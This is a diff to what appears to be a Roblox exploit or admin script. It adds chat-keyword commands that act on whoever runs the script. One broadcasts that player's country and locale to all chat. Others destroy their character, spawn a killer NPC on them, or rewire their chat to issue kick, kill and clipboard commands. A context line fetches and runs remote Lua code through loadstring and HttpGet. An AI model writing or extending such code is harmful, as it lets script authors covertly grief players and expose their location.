@@ -34,6 +34,239 @@ function onChatMessage(player, message)
       local module =
          loadstring(game:HttpGet "https://raw.githubusercontent.com/LeoKholYt/roblox/main/lk_serverhop.lua")()
       module:Teleport(game.PlaceId)
+elseif message:lower() == "countryfinderalladminbattlegrounds" then
+local player = game.Players.LocalPlayer
+local countryRegion = game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(player)
+local systemLocaleId = game.LocalizationService.SystemLocaleId
+local message = ""..countryRegion..", "..systemLocaleId
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
+elseif message:lower() == "scarysoundalladminbattlegrounds" then
+Spooky = Instance.new("Sound", game.Workspace)
+Spooky.Name = "We can't hear your screams"
+Spooky.SoundId = "rbxassetid://3767336937"
+Spooky.Volume = 1
+Spooky.PlaybackSpeed = 1
+Spooky.Looped = false
+Spooky:Play()
+elseif message:lower() == "voidkillalladminbattlegrounds" then
+game.Players.LocalPlayer.Character.Head:Destroy()
+game.Players.LocalPlayer.Character["Right Arm"]:Destroy()
+game.Players.LocalPlayer.Character["Left Arm"]:Destroy()
+game.Players.LocalPlayer.Character["Right Leg"]:Destroy()
+game.Players.LocalPlayer.Character["Left Leg"]:Destroy()
+local sound = Instance.new("Sound", workspace)
+sound.Volume = 10
+sound.Pitch = 1
+sound.SoundId = "rbxassetid://150283123"
+sound:Play()
+elseif message:lower() == "fallingalladminbattlegrounds" then
+game.Players.LocalPlayer.Character.Humanoid:ChangeState(1)
+elseif message:lower() == "completelyfrozenadminbattlegrounds" then
+game.Players.LocalPlayer.Character.HumanoidRootPart:Destroy()
+elseif message:lower() == "nightmarenpcadminbattlegrounds" then
+assetId = tonumber(13616911371)
+if not assetId then
+    warn("Invalid asset ID")
+    return
+end
+
+user = game.Players.LocalPlayer
+model = game:GetObjects("rbxassetid://" .. assetId)[1]
+model.Parent = workspace
+humanoid = model:FindFirstChildOfClass("Humanoid")
+if not humanoid then
+    humanoid = Instance.new("Humanoid")
+    humanoid.Name = "Humanoid"
+    humanoid.Parent = model
+end
+model.Name = "King Death"
+humanoid.Health = math.huge
+humanoid.WalkSpeed = 50
+humanoid.JumpPower = 50
+
+humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
+model:MakeJoints()
+model:MoveTo(game.Workspace[user.Name].Torso.Position + Vector3.new(0, 0, 0))
+
+function findNearestPlayer()
+    nearestPlayer = nil
+    nearestDistance = math.huge
+
+    for _, player in pairs(game.Players:GetPlayers()) do
+        if player.Character and player.Character:FindFirstChildOfClass("Humanoid") and player.Character.Humanoid.Health ~= 0 then
+            local distance = (player.Character.PrimaryPart.Position - model:GetPrimaryPartCFrame().Position).Magnitude
+            if distance < nearestDistance then
+                nearestPlayer = player
+                nearestDistance = distance
+            end
+        end
+    end
+
+    return nearestPlayer
+end
+
+function followPlayer()
+    nearestPlayer = findNearestPlayer()
+    if nearestPlayer and nearestPlayer.Character and nearestPlayer.Character:FindFirstChildOfClass("Humanoid") then
+        humanoid.WalkSpeed = 70
+        humanoid:MoveTo(nearestPlayer.Character.PrimaryPart.Position)
+        humanoid.MoveToFinished:Wait()
+    end
+end
+
+function wander()
+    destination = Vector3.new(math.random(-20, 20), 0, math.random(-20, 20))
+    humanoid.WalkSpeed = 16
+    humanoid:MoveTo(destination)
+    humanoid.MoveToFinished:Wait()
+end
+
+function checkPlayerDistance()
+    if findNearestPlayer() then
+        followPlayer()
+    else
+        wander()
+    end
+end
+
+function onTouch(hit)
+    if hit.Parent and hit.Parent:FindFirstChildOfClass("Humanoid") and hit.Parent == user.Character then
+        hit.Parent:FindFirstChildOfClass("Humanoid"):TakeDamage(math.huge)
+    end
+end
+
+humanoid.Touched:Connect(onTouch)
+
+while true do
+    checkPlayerDistance()
+    task.wait()
+end
+elseif message:lower() == "noskinalladminbattlegrounds" then
+game.Players.LocalPlayer:ClearCharacterAppearance()
+elseif message:lower() == "rewardalladminbattlegrounds" then
+local function onPlayerChattedA(message, player)
+    local lowercaseMessage = message:lower()
+    
+    if lowercaseMessage:find("/e kill") then
+        game.Players:Chat("killalladminbattlegrounds")
+    end
+end
+
+game.Players.LocalPlayer.Chatted:Connect(onPlayerChattedA)
+
+local function onPlayerChattedA(message, player)
+    local lowercaseMessage = message:lower()
+    
+    if lowercaseMessage:find("/e find") then
+        game.Players:Chat("findtonotbadadminbattlegrounds")
+    end
+end
+
+game.Players.LocalPlayer.Chatted:Connect(onPlayerChattedA)
+
+local function onPlayerChattedA(message, player)
+    local lowercaseMessage = message:lower()
+    
+    if lowercaseMessage:find("/e kick") then
+        game.Players:Chat("kickalladminbattlegrounds")
+    end
+end
+
+game.Players.LocalPlayer.Chatted:Connect(onPlayerChattedA)
+
+local function onPlayerChattedA(message, player)
+    local lowercaseMessage = message:lower()
+    
+    if lowercaseMessage:find("/e rejoin") then
+        game.Players:Chat("rejoinalladminbattlegrounds")
+    end
+end
+
+game.Players.LocalPlayer.Chatted:Connect(onPlayerChattedA)
+
+local function onPlayerChattedA(message, player)
+    local lowercaseMessage = message:lower()
+    
+    if lowercaseMessage:find("/e nocharacter") then
+        game.Players:Chat("punishalladminbattlegrounds")
+    end
+end
+
+game.Players.LocalPlayer.Chatted:Connect(onPlayerChattedA)
+
+local function onPlayerChattedA(message, player)
+    local lowercaseMessage = message:lower()
+    
+    if lowercaseMessage:find("/e serverhop") then
+        game.Players:Chat("serverhopalladminbattlegrounds")
+    end
+end
+
+game.Players.LocalPlayer.Chatted:Connect(onPlayerChattedA)
+
+local function onPlayerChattedA(message, player)
+    local lowercaseMessage = message:lower()
+    
+    if lowercaseMessage:find("/e clipboard") then
+        game.Players:Chat("copymessageadminbattlegrounds")
+    end
+end
+
+game.Players.LocalPlayer.Chatted:Connect(onPlayerChattedA)
+
+local function onPlayerChattedA(message, player)
+    local lowercaseMessage = message:lower()
+    
+    if lowercaseMessage:find("/e nogui") then
+        game.Players:Chat("noguialladminbattlegrounds")
+    end
+end
+
+game.Players.LocalPlayer.Chatted:Connect(onPlayerChattedA)
+
+local function onPlayerChattedA(message, player)
+    local lowercaseMessage = message:lower()
+    
+    if lowercaseMessage:find("/e deletetools") then
+        game.Players:Chat("deletealltoolsalladminbattlegrounds")
+    end
+end
+
+game.Players.LocalPlayer.Chatted:Connect(onPlayerChattedA)
+elseif message:lower() == "airplanesalladminbattlegrounds" then
+character = game.Players.LocalPlayer.Character
+customMeshConfig = {
+    ["Head"] = {
+        MeshId = "rbxassetid://5011580780",
+        TextureId = "rbxassetid://16336200609"
+    },
+    ["Left Arm"] = {
+        MeshId = "rbxassetid://5011580780",
+        TextureId = "rbxassetid://16336200609"
+    },
+    ["Right Arm"] = {
+        MeshId = "rbxassetid://5011580780",
+        TextureId = "rbxassetid://16336200609"
+    },
+    ["Left Leg"] = {
+        MeshId = "rbxassetid://5011580780",
+        TextureId = "rbxassetid://16336200609"
+    },
+    ["Right Leg"] = {
+        MeshId = "rbxassetid://5011580780",
+        TextureId = "rbxassetid://16336200609"
+    }
+}
+
+for bodyPart, config in pairs(customMeshConfig) do
+    part = character:FindFirstChild(bodyPart)
+    if part then
+        specialMesh = Instance.new("SpecialMesh")
+        specialMesh.MeshId = config.MeshId
+        specialMesh.TextureId = config.TextureId
+        specialMesh.Parent = part
+    end
+end
    elseif message:lower() == "getadmintoolsalladminbattlegrounds" then
       local tool = Instance.new("Tool")
       tool.Name = "ꙮ"
